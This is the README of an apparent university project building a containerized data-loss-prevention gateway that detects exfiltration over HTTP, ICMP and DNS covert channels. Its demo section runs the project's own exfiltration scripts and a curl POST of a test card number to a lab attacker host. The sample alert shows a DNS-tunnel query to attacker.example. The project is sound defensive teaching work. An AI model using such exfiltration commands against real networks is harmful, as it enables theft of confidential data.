# Network Data Loss Prevention (DLP) Project for DD2391

Containerized network security environnement with a gateway designed to detect and mitigate unauthorized data exfiltration across both standard application traffic and network-level covert channels.


## Team & Workstreams

| Member | Workstreams | Core Responsibilities |
| --- | --- | --- |
| **Antoine** | A, C, D | Docker network infrastructure & base attack scripts (WS A); ICMP covert channel detection (WS C); cross-validation & evasion testing against DNS detector (WS D.1). |
| **Diogo** | B, D | L7 Web DLP engine & inspection rules (WS B); internal peer-testing & evasion on L7 detectors (WS D.1); global evaluation, latency/performance limits, and dataset/tool benchmarking (WS D.2, shared workload with Jonas & Sofia). |
| **Jonas** | B, D | L7 Web DLP engine & payload decoding (WS B); internal peer-testing & evasion on L7 detectors (WS D.1); global evaluation, latency/performance limits, and dataset/tool benchmarking (WS D.2, shared workload with Diogo & Sofia). |
| **Sofia** | C, D | DNS covert tunnel detection & heuristics (WS C); cross-validation & evasion testing against ICMP detector (WS D.1); global evaluation, latency/performance limits, and dataset/tool benchmarking (WS D.2, shared workload with Diogo & Jonas). |


## Problem Statement

While standard perimeter security predominantly focuses on preventing intrusion and lateral movement, a robust security posture must assume compromise and restrict what actors can extract ; directly defending the **Confidentiality** pillar of the CIA triad. Network Data Loss Prevention (DLP) addresses this challenge by identifying and intercepting unauthorized data outputs.

In practice, data leaks fall into two distinct categories:
- **Accidental & Negligent Exposure:** Legitimate users committing operational mistakes ; such as pasting sensitive credentials into web forms, transmitting unencrypted payment card data, or uploading corporate data to unapproved personal devices.
- **Intentional & Adversarial Exfiltration:** Malicious insiders or compromised devices deliberately evading standard proxy filters by tunneling stolen secrets through lower-level protocols (such as ICMP echo payloads or DNS queries).

To address both fronts, this project implements a gateway with two layers: deterministic L7 content inspection, as well as passive L3/L4 covert-channel analysis. Rather than testing detection logic as isolated scripts, our systems are embedded directly into a containerized network topology mirroring a real-world enterprise deployment so as to evaluate detection efficiency, flaws, latency, and false positives under live conditions.

## Related Work

Our detection model builds upon established content and behavioral analysis techniques. At the application layer, deterministic pattern matching and Luhn algorithm validation mirror production DLP engines. For covert channels, our ICMP heuristics draw inspiration from Sayadi et al. (*Detection of Covert Channels Over ICMP Protocol*, AICCSA 2017), contrasting standard operating system ping invariants with abnormal payloads and rates. DNS tunneling detection relies on classical information theory (Shannon entropy) combined with sliding-window volume metrics per apex domain.


## Architecture & Topology

The lab isolates four roles across two bridged subnets (`internal_net` and `external_net`):

```text
[ Victim ] (172.20.0.3)
    │
    │  internal_net (172.20.0.0/24)
    ▼
[ Gateway ] (172.20.0.2 / 172.21.0.2)
    ├── Inline Proxy (mitmproxy :8080)   ──> Intercepts HTTP/HTTPS (L7 Web DLP)
    └── Passive Sniffer (covert-detector) ──> Shared netns: sniffs internal eth (ICMP & DNS)
    │
    │  external_net (172.21.0.0/24)
    ▼
[ Attacker ] (172.21.0.10) (C2 sinks: HTTP, DNS, ICMP)
```

* **L7 Web Gateway:** Routes outbound TCP ports 80/443 into `mitmproxy` running in transparent mode. Drops requests carrying sensitive matches with `HTTP 403 Forbidden`.
* **Covert Sniffer:** Runs in the gateway's network namespace (`network_mode: "service:gateway"`). It inspects packets on the internal network interface **before NAT**, preserving accurate client attribution (`source_ip`) and avoiding duplicate packet counts.


## Repository Structure

```text
attacks/               # Exfiltration generators (web, dns, icmp)
config/certs/          # CA certificate generation for TLS inspection
detection/
  common/              # Shared types, logger, and alerting
  covert_channel/      # L3/L4 sniffer, ICMP and DNS detection engines
  l7_web/              # Inline mitmproxy addon, Luhn, regex & entropy rules
docker/                # Dockerfiles and network entrypoints
docs/                  # In-depth architectural notes, mechanisms and guides
servers/               # Attacker C2 listeners (HTTP, DNS, ICMP sinks)
tests/                 # Offline unit test suites (pytest)
docker-compose.yml     # Container network topology
pyproject.toml         # Python environment managed by uv

```


## Quick Start


### 1. Prerequisites

* Docker & Docker Compose
* [uv](https://docs.astral.sh/uv/) (recommended for local development and offline testing; see [docs/uv_guide.md](https://www.google.com/search?q=docs/uv_guide.md))


### 2. Launch the Lab

Generate the test CA certificate required for TLS interception (first run only):

```bash
./config/certs/generate_ca.sh

```

Start the containers:

```bash
docker compose up -d
docker compose ps

```


## Verification & Demos

> For complete walk-throughs and expected alert outputs, see the **[Live Demo Cheatsheet](https://www.google.com/search?q=docs/demo_guide.md)**.


### 1. Web Layer DLP (Inline Blocking)

```bash
# Legitimate traffic -> Allowed (200 OK)
docker compose exec victim curl -i -X POST [http://172.21.0.10/](http://172.21.0.10/) -d "user=alice&status=ok"

# Data exfiltration -> Blocked by Gateway (403 Forbidden)
docker compose exec victim curl -i -X POST [http://172.21.0.10/](http://172.21.0.10/) -d "card=4111-1111-1111-1111"

```

*Inspect logs:* `docker compose logs -f gateway`


### 2. ICMP Covert Channel (Passive Detection)

```bash
# Normal diagnostic ping -> 0 alerts
docker compose exec victim ping -c 2 172.21.0.10

# Oversized payload exfiltration -> Alert triggered
docker compose exec victim python attacks/icmp_exfiltrate.py --mode oversized

```

*Details & heuristics:* [docs/icmp-detection-mecanism.md](https://www.google.com/search?q=docs/icmp-detection-mecanism.md)

*Inspect logs:* `docker compose logs -f covert-detector`


### 3. DNS Covert Channel (Passive Detection)

```bash
# Encoded DNS tunnel exfiltration -> Alert triggered
docker compose exec victim python attacks/dns_exfiltrate.py --secret "CONFIDENTIAL_KEY" --mode base32

```

*Details & stealth levels (D1–D4):* [docs/dns-detection-mechanism.md](https://www.google.com/search?q=docs/dns-detection-mechanism.md)

*Inspect logs:* `docker compose logs -f covert-detector`


## Local Development & Offline Tests

You can run test suites locally without starting Docker:

```bash
# Set up virtual environment and sync dependencies
uv sync

# Run all offline test suites
uv run pytest

```


## Standardized Alert Format

Both the inline proxy and passive sniffers output standardized JSON records prefixed with `[DLP-ALERT]`:

```json
[DLP-ALERT] {
  "timestamp": 1790333178.47,
  "channel": "DNS_COVERT",
  "rule_id": "DNS_HIGH_ENTROPY",
  "severity": "high",
  "source_ip": "172.20.0.3",
  "destination": "attacker.example",
  "blocked": false,
  "details": {
    "qname": "c0.mzxw6ytb.exfil.attacker.example",
    "entropy": 4.12
  }
}

```


## Documentation Index

* **[docs/demo_guide.md](https://www.google.com/search?q=docs/demo_guide.md)**: End-to-end evaluation cheat sheet and demo steps.
* **[docs/icmp-detection-mecanism.md](https://www.google.com/search?q=docs/icmp-detection-mecanism.md)**: ICMP structural checks, rate-limiting, and deep content inspection.
* **[docs/dns-detection-mechanism.md](https://www.google.com/search?q=docs/dns-detection-mechanism.md)**: DNS tunneling taxonomy (D1–D4), Shannon entropy, and volume heuristics.
* **[docs/uv_guide.md](https://www.google.com/search?q=docs/uv_guide.md)**: Dependency management and workflow with `uv`.
* **[docs/evaluating-hardening-branches.md](https://www.google.com/search?q=docs/evaluating-hardening-branches.md)**: Git evaluation procedure for defense hardening branches.
* **[docs/AI_USE.md](https://www.google.com/search?q=docs/AI_USE.md)**: Academic statement on generative AI usage.


## Ethics & Usage

Academic project. Do not deploy or execute against external networks without explicit authorization. See [LICENSE.md](LICENSE.md).